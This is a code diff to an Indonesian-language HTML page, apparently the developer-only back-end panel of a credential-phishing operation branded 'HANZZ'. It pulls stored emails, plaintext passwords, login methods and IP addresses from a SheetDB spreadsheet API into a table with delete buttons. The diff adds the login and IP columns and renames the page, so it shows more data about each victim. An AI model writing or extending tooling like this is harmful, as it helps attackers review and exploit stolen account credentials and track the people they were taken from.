@@ -11,17 +11,21 @@
         .navbar-content { max-width: 1400px; margin: 0 auto; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 15px; }
         .logo { font-size: 1.5rem; font-weight: bold; background: linear-gradient(135deg, #ff3b3b, #ff8080); -webkit-background-clip: text; background-clip: text; color: transparent; }
         .btn-refresh { background: rgba(255,59,59,0.15); border: 1px solid rgba(255,59,59,0.3); padding: 8px 18px; border-radius: 10px; color: #ff6b6b; cursor: pointer; }
-        .container { max-width: 1200px; margin: 40px auto; padding: 0 20px; }
+        .container { max-width: 1400px; margin: 40px auto; padding: 0 20px; }
         .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 25px; }
         .header h1 { color: #ff3b3b; font-size: 22px; }
         .table-card { background: #111; border-radius: 16px; overflow-x: auto; border: 1px solid rgba(255,59,59,0.2); }
-        table { width: 100%; border-collapse: collapse; }
-        th, td { padding: 14px; text-align: left; border-bottom: 1px solid #2a2a2a; }
+        table { width: 100%; border-collapse: collapse; min-width: 600px; }
+        th, td { padding: 12px 14px; text-align: left; border-bottom: 1px solid #2a2a2a; }
         th { background: #1a1a1a; color: #ff6b6b; }
         .btn-delete { background: #dc2626; color: white; border: none; padding: 6px 14px; border-radius: 6px; cursor: pointer; font-size: 12px; }
         .loading { text-align: center; padding: 40px; color: #888; }
-        @keyframes spin { to { transform: rotate(360deg); } }
         .footer-note { text-align: center; margin-top: 30px; color: #666; font-size: 12px; }
+        code { background: #1a1a1a; padding: 2px 6px; border-radius: 4px; font-size: 12px; }
+        @media (max-width: 768px) {
+            th, td { padding: 8px 10px; font-size: 12px; }
+            code { font-size: 10px; }
+        }
     </style>
 </head>
 <body>
@@ -32,17 +36,33 @@
         </div>
     </div>
     <div class="container">
-        <div class="header"><h1>Database Email & Password</h1></div>
+        <div class="header"><h1>HANZZ JASTEB/</h1></div>
         <div id="loading" class="loading">Memuat data...</div>
-        <div class="table-card" id="tableCard" style="display:none;"><table><thead><tr><th>Email</th><th>Password</th><th style="width:100px">Aksi</th></tr></thead><tbody id="dataList"></tbody></table></div>
+        <div class="table-card" id="tableCard" style="display:none;">
+            <table>
+                <thead>
+                    <tr>
+                        <th>Email</th>
+                        <th>Password</th>
+                        <th>Login</th>
+                        <th>IP Address</th>
+                        <th style="width:80px">Aksi</th>
+                    </tr>
+                </thead>
+                <tbody id="dataList"></tbody>
+            </table>
+        </div>
         <div class="footer-note">Present By HANZZ</div>
     </div>
     <script>
-        const SHEETDB_URL = "https://sheetdb.io/api/v1/88dp9i3eezpg7";
+        const SHEETDB_URL = "https://sheetdb.io/api/v1/7dlf0v09e7kqb";
         const userData = localStorage.getItem("userLogin");
         if (!userData) { window.location.href = "index.html"; }
         const user = JSON.parse(userData);
         if (user.role !== "Developer") { alert("Akses ditolak! Halaman ini hanya untuk Developer."); window.location.href = "index.html"; }
+        
+        function escapeHtml(t) { if(!t) return "-"; const d=document.createElement("div"); d.textContent=t; return d.innerHTML; }
+        
         async function loadData() {
             const loading = document.getElementById("loading");
             const card = document.getElementById("tableCard");
@@ -52,10 +72,21 @@
                 const res = await fetch(SHEETDB_URL);
                 const data = await res.json();
                 if (!data.length) { loading.innerText = "Data kosong."; return; }
-                data.forEach(item => { list.innerHTML += `<tr><td><code>${escapeHtml(item.Email)}</code></td><td><code>${escapeHtml(item.Password)}</code></td><td><button class="btn-delete" onclick="hapusData('${escapeHtml(item.Email)}')">Hapus</button></td></tr>`; });
+                data.forEach(item => { 
+                    list.innerHTML += `
+                        <tr>
+                            <td><code>${escapeHtml(item.Email)}</code></td>
+                            <td><code>${escapeHtml(item.Password)}</code></td>
+                            <td><code>${escapeHtml(item.Login)}</code></td>
+                            <td><code>${escapeHtml(item["IP Addres"])}</code></td>
+                            <td><button class="btn-delete" onclick="hapusData('${escapeHtml(item.Email)}')">Hapus</button></td>
+                        </tr>
+                    `; 
+                });
                 loading.style.display = "none"; card.style.display = "block";
             } catch(e) { loading.innerText = "Gagal koneksi."; }
         }
+        
         async function hapusData(email) {
             if(!confirm(`Hapus data untuk ${email}?`)) return;
             try {
@@ -65,7 +96,7 @@
                 else alert("Gagal hapus");
             } catch(e) { alert("Error"); }
         }
-        function escapeHtml(t) { if(!t) return ""; const d=document.createElement("div"); d.textContent=t; return d.innerHTML; }
+        
         loadData();
     </script>
 </body>
